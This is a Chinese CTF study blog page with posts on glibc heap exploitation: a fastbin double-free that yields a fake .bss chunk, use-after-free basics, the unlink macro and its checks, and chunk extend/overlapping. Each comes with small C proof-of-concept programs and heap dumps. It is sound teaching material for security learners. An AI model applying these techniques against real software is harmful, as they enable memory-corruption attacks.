<span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class"> 5 &#123;</span></span><br><span class="line"> <span class="number">6</span>     <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line"> <span class="number">7</span>     <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line"> <span class="number">8</span>     <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line"> <span class="number">9</span>     <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line"><span class="number">10</span> &#125; CHUNK,*PCHUNK;</span><br><span class="line"><span class="number">11</span> </span><br><span class="line"><span class="number">12</span> CHUNK bss_chunk;</span><br><span class="line"><span class="number">13</span> </span><br><span class="line"><span class="number">14</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">15 &#123;</span><br><span class="line"><span class="number">16</span>     <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line"><span class="number">17</span>     <span class="type">void</span> *chunk_a,*chunk_b;</span><br><span class="line"><span class="number">18</span> </span><br><span class="line"><span class="number">19</span>     bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line"><span class="number">20</span>     chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">21</span>     chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">22</span> </span><br><span class="line"><span class="number">23</span>     <span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">free</span>(chunk2);</span><br><span class="line"><span class="number">25</span>     <span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="number">26</span> </span><br><span class="line"><span class="number">27</span>     chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">28</span>     *(<span class="type">long</span> <span class="type">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line"><span class="number">29</span>     <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">30</span>     <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">31</span>     chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">32</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,chunk_b);</span><br><span class="line"><span class="number">33</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">34</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\16350\Downloads\0af2d29ffc6fe4a3064729a7adc8a1c2.png"></p>
<blockquote>
<p><strong>首先经过double free之后fastbin中的单向链表为chunk1_double –&gt; chunk2 –&gt; chunk1在经过一次malloc申请后main_arena指向的chunk1_double被重新启用，即chunk1倍重新启用，main_arena指向chunk2，并且将chunk1的fd从原来的指向chunk2修改为指向结构体指针chunk1 –&gt; bss_chunk，也就是说在fastbin单向链表中bss_chunk已经作为chunk1前一个被释放的块的存在了</strong></p>
<p><strong>接下来第二次malloc申请后main_arena指向的chunk2被启用，main_arena重新指向chunk1</strong></p>
<p><strong>第三次malloc申请后chunk1再一次被启用，main_arena指向chunk的fd指向的bss_chunk</strong></p>
<p><strong>那么在第四次malloc申请的时候此时main_arena指向的bss_chunk就会被启用</strong></p>
</blockquote>
<p>虽然bss_chunk并不是在内存中正常申请的chunk，但是由于我们可以修改chunk1的fd，使他指向bss_chunk，那么即使bss_chunk位于bss段，也会被当作一个chunk来被启用</p>
<p>那么在程序第31行代码中chunk_b其实被赋予的就是bss_chunk的结构体指针，所以在第32行输出的时候实际输出的是bss_chunk的chunk地址</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/11/uaf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/11/uaf/" class="post-title-link" itemprop="url">uaf</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-11-11 22:11:23" itemprop="dateCreated datePublished" datetime="2024-11-11T22:11:23+08:00">2024-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-15 20:50:37" itemprop="dateModified" datetime="2024-11-15T20:50:37+08:00">2024-11-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Use After Free<br>原理：</p>
<p>使用被释放的内存块。其实当一个内存块被释放之后重新使用有如下几种情况：</p>
<blockquote>
<ol>
<li><strong>内存块被释放后，其对应的指针被设置为NULL，再次使用时程序会崩溃</strong></li>
<li><strong>内存块被释放后，其对应的指针没有被设置为NULL，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序有可能可以正常运转</strong></li>
<li><strong>内存块被释放后，其对应的指针没有被设置为NULL，但是在下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能出现问题</strong></li>
</ol>
</blockquote>
<p>我们一般所指的Use After Free漏洞主要是后两种，一般将释放后没有被设置为NULL的内存指针为<strong>dangling pointer</strong></p>
<p>Tips：</p>
<blockquote>
<p>有且仅有指针不置空，才能做到对其的二次利用（free可以，但指针置空不可）。</p>
<p>先被释放的往往最后启用，最后释放往往最先启用。</p>
<p>被释放后，user_date的内容不会被清除，会被保留。（可利用此点‘更改’不能改动的chunk）</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/Unlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/10/Unlink/" class="post-title-link" itemprop="url">Unlink</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-11-10 20:58:44 / 修改时间：21:06:36" itemprop="dateCreated datePublished" datetime="2024-11-10T20:58:44+08:00">2024-11-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Unlink<br>Unlink是什么<br>在讲那个wiki上被转发烂了的chunk图之前有两个点先解决一下：</p>
<p>unlink是什么<br>什么时候执行了unlink<br>这两个点也是我在初期一直都很困惑的地方，直到翻看了libc的源码（可以在这里下载，我下载的是2.23），在malloc.c中找到了unlink。unlink其实是libc中定义的一个宏，定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            </span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      </span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  </span><br><span class="line">    else &#123;								      </span><br><span class="line">        FD-&gt;bk = BK;							      </span><br><span class="line">        BK-&gt;fd = FD;							      </span><br><span class="line">        if (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      </span><br><span class="line">	    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      </span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    </span><br><span class="line">	      malloc_printerr (check_action,				      </span><br><span class="line">			       &quot;corrupted double-linked list (not small)&quot;,    </span><br><span class="line">			       P, AV);					      </span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;				      </span><br><span class="line">                if (P-&gt;fd_nextsize == P)				      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      </span><br><span class="line">                else &#123;							      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      </span><br><span class="line">                  &#125;							      </span><br><span class="line">              &#125; else &#123;							      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      </span><br><span class="line">              &#125;								      </span><br><span class="line">          &#125;								      </span><br><span class="line">      &#125;									      </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那什么时候执行了unlink呢？在执行free()函数时执行了 _int_free()函数，在_int_free()函数中调用了unlink宏，大概的意思如下（注意_int_free()是函数不是宏）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD)</span><br><span class="line">static void _int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">free()&#123;</span><br><span class="line">	_int_free()&#123;</span><br><span class="line">		unlink();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>堆释放<br>好了关于unlink的部分先暂停一下，这里我们需要回顾一下调用free()函数堆释放这部分的知识</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//gcc -g test.c -o test</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line"> void main()&#123;</span><br><span class="line">         long *hollk1 = malloc(0x80);</span><br><span class="line">         long *first_chunk = malloc(0x80);</span><br><span class="line">         long *hollk3 = malloc(0x80);</span><br><span class="line">         long *second_chunk = malloc(0x80);</span><br><span class="line">         long *hollk5 = malloc(0x80);</span><br><span class="line">         long *third_chunk = malloc(0x80);</span><br><span class="line">         long *hollk7 = malloc(0x80);</span><br><span class="line">         </span><br><span class="line">         free(first_chunk);</span><br><span class="line">        free(second_chunk);</span><br><span class="line">         free(third_chunk);</span><br><span class="line">  </span><br><span class="line">         return 0;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>举一个例子，这里申请了7个chunk，接着依次释放了first_chunk、second_chunk、third_chunk。这里为什么释放这几个chunk呢，因为地址相邻的chunk释放之后会进行合并，地址不相邻的时候不会合并。由于申请的是0x80的chunk，所以在释放之后不会进fastbin而是先进unsortbin。我们用gdb打开编译好的例子，因为使用了-g参数，所以我们在第17行使用命令b 17下断点，接下来让程序跑起来，使用命令bin我们看一下双向链表中的排列结构：</p>
<p>离近点看！ 可以模糊的看到已经有三个chunk_free进入了unsortbin。那么这三个chunk_free从右向左分别对应着first_chunk、second_chunk、third_chunk，我们使用heap命令查看一下这几个chunk：</p>
<p>这几个释放的chunk已经按照unsortbin中的顺序排列。这里主要看每一个chunk的fd、bk：</p>
<p><em>first_bk -&gt; second</em><br><em>second_fd -&gt; first 、 second_bk -&gt; third</em><br><em>third_fd -&gt; second&#96;</em></p>
<p>unlink过程及检查<br>下面呢给出wiki上的链接，说实话wiki上的图和说明我是真的没看懂。。。。。所以我按照字节的例子和理解写出来：</p>
<p>wiki链接：<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a></p>
<p>wiki中unlink关键执行了如下的步骤：</p>
<p>FD &#x3D; P -&gt; fd &#x3D; target addr -12<br>BK &#x3D; P -&gt; bk &#x3D; expect value<br>FD -&gt; bk &#x3D; BK，即 *(target addr - 12 + 12) &#x3D; BK &#x3D; expect value<br>BK -&gt; fd &#x3D; FD，即 *(expect value + 8) &#x3D; FD &#x3D; target addr - 12<br>这后面的target、expect什么的我就不知道是啥了，感觉好像没什么用处。。。。。</p>
<p>我自己的理解<br>在此声明这里是我个人的理解，没有说wiki不对什么的，而且也是在wiki的基础上做了一些更加通俗易懂的变化</p>
<p>还是用前面堆释放的例子，依次释放了first_chunk、second_chunk、third_chunk，也就是说首先释放的是first，然后释放的是second，最后释放的是third。在双链表中的结构如下：</p>
<p>个人的理解unlink其实是想把second_chunk摘掉，那怎么摘呢？</p>
<p>在前面堆释放部分我们讲过fd其实是前一个被释放chunk的prev_size地址，bk是后一个被释放的chunk的prev_size地址，所以：</p>
<p>如果second_chunk被摘掉，那么就会变成下面这样：</p>
<p>由于first_chunk是最开始被释放的，所以first_chunk相对于third_chunk是前一个被释放的块。同样的third_chunk是之后释放的，所以third_chunk相对于first_chunk是后一个被释放的块，所以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">first_bk = third_prev_addr</span><br><span class="line">third_fd = first_prev_addr</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以我的理解中对应着wiki的表现形式就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">second_fd = first_prev_addr</span><br><span class="line">second_bk = third_prev_addr</span><br><span class="line">first_bk = third_prev_addr </span><br><span class="line">third_fd = first_prev_addr </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>※※※※※※※※执行流程有先后顺序※※※※※※※※</p>
<p>chunk状态检查<br>现在我们用的大多数linux都会对chunk状态进行检查，以免造成二次释放或者二次申请的问题。但是恰恰是这个检查的流程本身就存在一些问题，能够让我们进行利用。回顾一下以往我们做的题，大部分都是顺着原有的执行流程走，但是通过修改执行所用的数据来改变执行走向。unlink同样可以以这种方式进行利用，由于unlink是在free()函数中调用的，所以我们只看chunk空闲时都需要检查写什么</p>
<p>我们还是拿前面的例子来说：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">//gcc -g test.c -o test</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="number">5</span>         <span class="type">long</span> *hollk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">6</span>         <span class="type">long</span> *first_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">7</span>         <span class="type">long</span> *hollk3 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">8</span>         <span class="type">long</span> *second_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">9</span>         <span class="type">long</span> *hollk5 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">10</span>         <span class="type">long</span> *third_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">11</span>         <span class="type">long</span> *hollk7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">12</span>         </span><br><span class="line"><span class="number">13</span>         <span class="built_in">free</span>(first_chunk);</span><br><span class="line"><span class="number">14</span>         <span class="built_in">free</span>(second_chunk);</span><br><span class="line"><span class="number">15</span>         <span class="built_in">free</span>(third_chunk);</span><br><span class="line"><span class="number">16</span>  </span><br><span class="line"><span class="number">17</span>         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">18</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次我们在第17行下断点，并且查看一下second_chunk：</p>
<p>检查1：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p>
<p>可以看左图绿色框中的内容，上面绿色框中的内容是second_chunk的size大小，下面绿色框中的内容是hollk5的prev_size，这两个绿色框中的数值是需要相等的（忽略P标志位）。在wiki上我记得在基础部分有讲过，如果一个块属于空闲状态，那么相邻高地址块的prev_size为前一个块的大小</p>
<p>检查2：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p>
<p>可以看左图蓝色框中的内容，这里是hollk5的size，hollk5的size的P标志位为0，代表着它前一个chunk(second_chunk)为空闲状态</p>
<p>检查3：检查前后被释放chunk的fd和bk</p>
<p>可以看左图红色框中的内容，这里是second_chunk的fd和bk。首先看fd，它指向的位置就是前一个被释放的块first_chunk，这里需要检查的是first_chunk的bk是否指向second_chunk的地址。再看second_chunk的bk，它指向的是后一个被释放的块third_chunk，这里需要检查的是third_chunk的fd是否指向second_chunk的地址</p>
<p>以上三点就是检查chunk是否空闲的三大标准。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/28/Overlapping/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/28/Overlapping/" class="post-title-link" itemprop="url">Overlapping</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-10-28 19:32:08 / 修改时间：20:57:08" itemprop="dateCreated datePublished" datetime="2024-10-28T19:32:08+08:00">2024-10-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Chunk-Extend-and-Overlapping（堆重叠）"><a href="#Chunk-Extend-and-Overlapping（堆重叠）" class="headerlink" title="Chunk Extend and Overlapping（堆重叠）"></a>Chunk Extend and Overlapping（堆重叠）</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p>
<ul>
<li>程序中存在基于堆的漏洞</li>
<li>漏洞可以控制 chunk header 中的数据</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p>
<p>在 ptmalloc 中，获取 chunk 块大小的操作如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Get size, ignoring use bits */</span><br><span class="line"><span class="comment">#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line">/* Like chunksize, but do <span class="keyword">not</span> mask SIZE_BITS.  */</span><br><span class="line"><span class="comment">#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>

<p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p>
<p>在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Ptr to <span class="built_in">next</span> physical malloc_chunk. */</span><br><span class="line"><span class="comment">#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>

<p>即使用当前块指针加上当前块大小。</p>
<p>在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Size of the chunk below P.  Only valid <span class="keyword">if</span> prev_inuse (P).  */</span><br><span class="line"><span class="comment">#define prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line">/* Ptr to previous physical malloc_chunk.  Only valid <span class="keyword">if</span> prev_inuse (P).  */</span><br><span class="line"><span class="comment">#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure>

<h5 id="即通过-malloc-chunk-prev-size-获取前一块大小，然后使用本-chunk-地址减去所得大小（可以通过改变prev-size来改变其指针所指位置）。"><a href="#即通过-malloc-chunk-prev-size-获取前一块大小，然后使用本-chunk-地址减去所得大小（可以通过改变prev-size来改变其指针所指位置）。" class="headerlink" title="即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小（可以通过改变prev_size来改变其指针所指位置）。"></a><strong>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小（可以通过改变prev_size来改变其指针所指位置）。</strong></h5><p>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>

<h5 id="即查看下一-chunk-的-prev-inuse-域，而下一块地址又如我们前面所述是根据当前-chunk-的-size-计算得出的。"><a href="#即查看下一-chunk-的-prev-inuse-域，而下一块地址又如我们前面所述是根据当前-chunk-的-size-计算得出的。" class="headerlink" title="即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。"></a><strong>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</strong></h5><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p>
<p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。</p>
<h2 id="基本示例-1：对-inuse-的-fastbin-进行-extend"><a href="#基本示例-1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="基本示例 1：对 inuse 的 fastbin 进行 extend"></a>基本示例 1：对 inuse 的 fastbin 进行 extend</h2><p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。 <strong>注意，我们的示例都是在 64 位的程序。如果想在 32 位下进行测试，可以把 8 字节偏移改为 4 字节</strong>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(<span class="number">0x10</span>);//分配第一个<span class="number">0x10</span>的chunk</span><br><span class="line">    malloc(<span class="number">0x10</span>);//分配第二个<span class="number">0x10</span>的chunk</span><br><span class="line"></span><br><span class="line">    *(long long *)((long long)ptr-<span class="number">0x8</span>)=<span class="number">0x41</span>;// 修改第一个块的size域</span><br><span class="line"></span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(<span class="number">0x30</span>);// 实现 extend，控制了第二个块的内容</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当两个 malloc 语句执行之后，堆的内存分布如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fc1</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40。在题目中这一步可以由堆溢出得到。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span> &lt;=== 篡改大小</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fc1</span> </span><br></pre></td></tr></table></figure>

<p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。</p>
